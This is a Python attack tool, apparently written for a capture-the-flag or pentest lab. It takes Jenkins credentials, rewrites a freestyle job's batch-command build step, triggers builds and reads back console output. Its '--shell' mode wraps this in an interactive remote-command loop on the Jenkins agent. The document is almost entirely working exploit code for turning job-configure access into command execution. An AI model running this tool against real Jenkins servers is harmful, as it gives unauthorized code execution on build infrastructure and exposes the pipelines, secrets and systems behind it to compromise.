#!/usr/bin/env python3

import argparse
import requests
import sys
import time
import xml.etree.ElementTree as ET
from io import BytesIO
from urllib.parse import urlparse, urlunparse, urljoin

# ====================== utils ======================

def get_jenkins_crumb(jenkins_url, username, api_token):
    """Fetch CSRF crumb (if enabled)."""
    url = f"{jenkins_url.rstrip('/')}/crumbIssuer/api/json"
    try:
        resp = requests.get(url, auth=(username, api_token), timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("crumbRequestField"), data.get("crumb")
    except requests.RequestException:
        pass
    return None, None

def normalize_to_base(returned_url: str, base_url: str) -> str:
    """
    Replace scheme+host:port of returned_url with those of base_url.
    Works even if returned_url is absolute (localhost) or relative (/job/...).
    """
    if not returned_url:
        return returned_url
    if returned_url.startswith("/"):
        returned_url = urljoin(base_url.rstrip("/") + "/", returned_url.lstrip("/"))
    ru = urlparse(returned_url)
    bu = urlparse(base_url)
    fixed = ru._replace(scheme=bu.scheme, netloc=bu.netloc)
    return urlunparse(fixed)

# =================== config ops ====================

def download_jenkins_job_config(jenkins_url, job_name, username, api_token, output_file):
    url = f"{jenkins_url.rstrip('/')}/job/{job_name}/config.xml"
    response = requests.get(url, auth=(username, api_token))
    if response.status_code == 200:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(response.text)
        print(f"[+] Config pulled and saved to {output_file}")
    else:
        print(f"[-] Failed to pull config: HTTP {response.status_code}")
        print(response.text.strip())

def replace_command_in_config(xml_bytes, new_command):
    """
    Replace <builders><hudson.tasks.BatchFile><command>...</command></hudson.tasks.BatchFile>
    (Freestyle job using Windows Batch builder)
    """
    try:
        tree = ET.ElementTree(ET.fromstring(xml_bytes))
    except ET.ParseError as e:
        raise ValueError(f"XML parse error: {e}")

    root = tree.getroot()
    cmd = root.find("./builders/hudson.tasks.BatchFile/command")
    if cmd is None:
        raise ValueError("No <command> element found in BatchFile builder.")
    cmd.text = new_command

    buf = BytesIO()
    tree.write(buf, encoding="utf-8", xml_declaration=True)
    return buf.getvalue()

def push_or_update_jenkins_job_config(jenkins_url, job_name, username, api_token, input_file, command=None, dry_run=False):
    try:
        with open(input_file, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        print(f"[-] Config file '{input_file}' not found.")
        return False

    if command is not None:
        try:
            data = replace_command_in_config(data, command)
            print(f"[+] Replaced <command> in job config")
        except ValueError as e:
            print(f"[-] {e}")
            return False

    if dry_run:
        sys.stdout.write(data.decode("utf-8", errors="replace"))
        return True

    url = f"{jenkins_url.rstrip('/')}/job/{job_name}/config.xml"
    headers = {"Content-Type": "text/xml"}
    crumb_field, crumb = get_jenkins_crumb(jenkins_url, username, api_token)
    if crumb_field and crumb:
        headers[crumb_field] = crumb

    resp = requests.post(url, data=data, headers=headers, auth=(username, api_token))
    if resp.status_code in [200, 201]:
        print(f"[+] Job '{job_name}' updated successfully.")
        return True
    else:
        print(f"[-] Failed to update job '{job_name}'")
        print(f"    HTTP {resp.status_code}")
        print(f"    Response: {resp.text.strip()}")
        return False

# ==================== build ops ====================

def _read_job_token(jenkins_url, job_name, username, api_token):
    """Return <authToken> from live config if present, else None."""
    cfg_url = f"{jenkins_url.rstrip('/')}/job/{job_name}/config.xml"
    cfg_resp = requests.get(cfg_url, auth=(username, api_token))
    if cfg_resp.status_code == 200:
        try:
            root = ET.fromstring(cfg_resp.text)
            auth = root.find("authToken")
            if auth is not None and auth.text:
                token = auth.text.strip()
                print(f"[+] Found job token in config: {token}")
                return token
        except ET.ParseError:
            return None
    return None

def trigger_jenkins_build_and_fetch_output(jenkins_url, job_name, username, api_token):
    """
    Triggers a build (using <authToken> if present), waits for execution to start,
    then fetches and prints /consoleText. Normalizes any returned URLs to --url.
    """
    base = jenkins_url.rstrip("/")

    # 1) Token (if any)
    job_token = _read_job_token(base, job_name, username, api_token)

    # 2) Trigger build
    build_trigger_url = f"{base}/job/{job_name}/build"
    if job_token:
        build_trigger_url += f"?token={job_token}"

    headers = {}
    crumb_field, crumb = get_jenkins_crumb(base, username, api_token)
    if crumb_field and crumb:
        headers[crumb_field] = crumb

    resp = requests.post(build_trigger_url, headers=headers, auth=(username, api_token), allow_redirects=False)
    if resp.status_code not in [200, 201, 202]:
        print(f"[-] Failed to trigger job build")
        print(f"    HTTP {resp.status_code}")
        print(f"    Response: {resp.text.strip()}")
        return False

    print(f"[+] Build triggered for job '{job_name}'")

    # 3) Queue location -> normalize
    queue_url = resp.headers.get("Location")
    if not queue_url:
        print("[!] No queue location returned, cannot track build.")
        return False
    queue_url = normalize_to_base(queue_url, base)
    print(f"[+] Queue URL: {queue_url}")

    # 4) Poll queue for executable/build URL
    build_url = None
    for _ in range(60):  # ~2m
        q = requests.get(urljoin(queue_url, "api/json"), auth=(username, api_token))
        if q.status_code == 200:
            j = q.json()
            if j.get("cancelled"):
                print("[-] Build was cancelled in queue.")
                return False
            if "executable" in j and j["executable"]:
                returned = j["executable"].get("url")
                build_url = normalize_to_base(returned, base)
                print(f"[+] Build assigned: {build_url}")
                break
        time.sleep(2)

    if not build_url:
        print("[-] Timed out waiting for build to start.")
        return False

    # 5) Fetch console output snapshot
    log_url = urljoin(build_url, "consoleText")
    print(f"[+] Fetching console output from {log_url}")
    log_resp = requests.get(log_url, auth=(username, api_token))
    if log_resp.status_code == 200:
        print("========== JOB OUTPUT ==========")
        print(log_resp.text)
        print("================================")
        return True
    else:
        print(f"[-] Failed to fetch console output: HTTP {log_resp.status_code}")
        if "Burp Suite" in log_resp.text:
            print("[!] A proxy intercepted the request. URL normalization is enabled; verify reachability.")
        return False

# ==================== interactive ====================

def interactive_shell(jenkins_url, job_name, username, api_token, config_file):
    """
    Interactive loop:
      - read command
      - patch <command> in local config_file
      - push update
      - trigger build and print console output
    """
    print("[*] Interactive shell mode. Type commands to run on the Jenkins agent.")
    print("    Type 'exit' or 'quit' to leave.\n")

    # Load base config once
    try:
        with open(config_file, "rb") as f:
            base_xml = f.read()
    except FileNotFoundError:
        print(f"[-] Config file '{config_file}' not found. Provide --file pointing to a valid config.xml.")
        return

    while True:
        try:
            cmd = input("jenkins$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting shell.")
            break

        if cmd.lower() in ("exit", "quit"):
            print("[*] Bye.")
            break
        if not cmd:
            continue

        # Write a temp modified config in-memory
        try:
            modified_xml = replace_command_in_config(base_xml, cmd)
        except ValueError as e:
            print(f"[-] {e}")
            continue

        # Upload modified config
        url = f"{jenkins_url.rstrip('/')}/job/{job_name}/config.xml"
        headers = {"Content-Type": "text/xml"}
        crumb_field, crumb = get_jenkins_crumb(jenkins_url, username, api_token)
        if crumb_field and crumb:
            headers[crumb_field] = crumb

        resp = requests.post(url, data=modified_xml, headers=headers, auth=(username, api_token))
        if resp.status_code not in [200, 201]:
            print(f"[-] Failed to update job '{job_name}'")
            print(f"    HTTP {resp.status_code}")
            print(f"    Response: {resp.text.strip()}")
            continue

        print(f"[+] Job '{job_name}' updated with new <command>")

        # Trigger and show output
        trigger_jenkins_build_and_fetch_output(jenkins_url, job_name, username, api_token)

# ======================= cli =======================

def main():
    parser = argparse.ArgumentParser(
        description="Pull, Update (replace <command>), Build Jenkins Job with console output; plus interactive --shell"
    )
    parser.add_argument("--url", help="Base URL of Jenkins server (e.g. http://10.10.11.132:8080)")
    parser.add_argument("--job", help="Jenkins job name")
    parser.add_argument("--user", help="Jenkins username")
    parser.add_argument("--token", help="Jenkins API token")
    parser.add_argument("--file", help="Path for config.xml (output for pull, input for push, and for --shell base)")

    parser.add_argument("--pull-config", action="store_true", help="Download config.xml to --file")
    parser.add_argument("--push-config", action="store_true", help="Upload config.xml (replace <command> if --command is set)")
    parser.add_argument("--command", help="Replace <command> content in config.xml before upload")
    parser.add_argument("--dry-run", action="store_true", help="Print modified XML instead of uploading")
    parser.add_argument("--build", action="store_true", help="Trigger job build and print console output")
    parser.add_argument("--shell", action="store_true", help="Interactive mode: run commands repeatedly via job updates/builds")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    # Basic required args for server ops
    if not all([args.url, args.job, args.user, args.token]):
        parser.print_help()
        print("\n[-] Error: --url --job --user --token are required.")
        sys.exit(1)

    # Interactive shell
    if args.shell:
        if not args.file:
            print("[-] --file is required for --shell (base config to edit).")
            sys.exit(1)
        interactive_shell(args.url, args.job, args.user, args.token, args.file)
        return

    # Pull
    if args.pull_config:
        if not args.file:
            print("[-] --file required for --pull-config")
            sys.exit(1)
        download_jenkins_job_config(args.url, args.job, args.user, args.token, args.file)

    # Push/update
    success = True
    if args.push_config:
        if not args.file:
            print("[-] --file required for --push-config")
            sys.exit(1)
        success = push_or_update_jenkins_job_config(
            args.url, args.job, args.user, args.token, args.file,
            command=args.command, dry_run=args.dry_run
        )

    # Build (after successful push, or standalone)
    if args.build and success:
        trigger_jenkins_build_and_fetch_output(args.url, args.job, args.user, args.token)

if __name__ == "__main__":
    main()
